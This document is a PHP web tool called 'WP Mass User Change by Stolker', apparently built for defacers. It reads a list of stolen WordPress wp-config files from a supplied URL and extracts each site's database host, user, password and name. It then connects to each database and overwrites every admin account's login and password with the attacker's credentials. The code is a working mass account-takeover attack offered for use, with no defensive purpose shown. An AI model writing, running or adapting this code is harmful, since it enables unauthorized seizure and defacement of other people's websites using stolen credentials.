<html>
<head>
	<title>WP Mass by Stolker</title>

</head>

<style type="text/css">
@import 'https://fonts.googleapis.com/css?family=Iceland';
html,body{
	background: black;
	padding: 0;
	direction: ltr;
	margin: 0;
}
h1{
	color:#16a085;
	text-shadow:0 0 5px;
	font-family: Iceland;
}
#gter{
	position: absolute;
	top: 0;
	width: 100%;
	text-align: center;
	background: black;
	color:#fff;
	padding-top: 10px;
	padding-bottom: 10px;
	font-family: Iceland;
	margin-bottom:20px;
}
#gter span{
	color:white;
	font-size: 18px;
	text-shadow: :0px 0px 15px #00ffff;
}
.f{
	color:white;
	font-family: Iceland;
	text-shadow: 0 0 15px #00ffff;
	font-size: 21px;
}
a{
	font-family: Iceland;
	text-decoration: none;
	color:white;
	text-shadow:0 0 15px #00ff00;
}
form{
	margin-top: 120px;
}
input[type=submit]{
	font-size:20px;
	height: 30px;
	width: 165px;
	border: 2px solid red;
	color: yellow;
	background-color: black;
	font-family: Iceland;
}
input[type=submit]:hover{
	box-shadow: 0 0 2px #ff0000;
}
input[type=text]{
	font-family:Iceland;
	width: 450px;
	height: 30px;
	color: red;
	background: #000000;
	border: 1px solid #00ff00;
	padding: 5px;
	text-align: center;
	font-size:20px;
}	
input[type=text]:focus{
	box-shadow: 0 0 3px #ff0000;
}
.heading{
	color:white;
	font-size:50px;
	margin-top: 60px;
	margin-bottom: -110px;
	font-family:Iceland;
	text-shadow:0px 0px 20px red;	
}
</style>




</head>
<body>
<center>
<center><p class="heading">WP Mass User Change by Stolker</p></center>
<br /><br />
<form method="post">
<input type="text" name="config" placeholder="Config URL Here">
<br><br>
<input type="submit" name="ch" value="Change Admin">
</form>
</center>
<?php 
set_time_limit(0); 
error_reporting(0); 
if($_POST['ch']){ $get2 = file_get_contents($_POST['config']); 
preg_match_all('#<a href="(.*?)"#', $get2, $config); 
foreach($config[1] as $don){ $get = file_get_contents($_POST['config']."/".$don); 
preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host); 
foreach($host[1] as $don){ $host = $don; } 
preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass); foreach($pass[1] as $done){ $password = $done; } preg_match_all("#'DB_USER', '(.*?)'#", $get, $user); 
foreach($user[1] as $done1){ $user = $done1; 
} preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name); foreach($name[1] as $done2){ $name = $done2; 
} preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix); foreach($prefix[1] as $done3){ $prefix = $done3; 
} $connect = mysqli_connect($host,$user,$password,$name); 
if($connect){ $query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'"); 
while($siteurl = mysqli_fetch_array($query1)){ $site_url = $siteurl['option_value']; 
} $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Stolkersex',user_pass='071f7dfde36326f5057f46735fc72a12'"); 
if($query2){ 
echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a><br><br>UserName : Stolkersex<br><br>Password : Stolkerdefacer<br><br></span></center>"; } } } } 
?>
</body>
</html>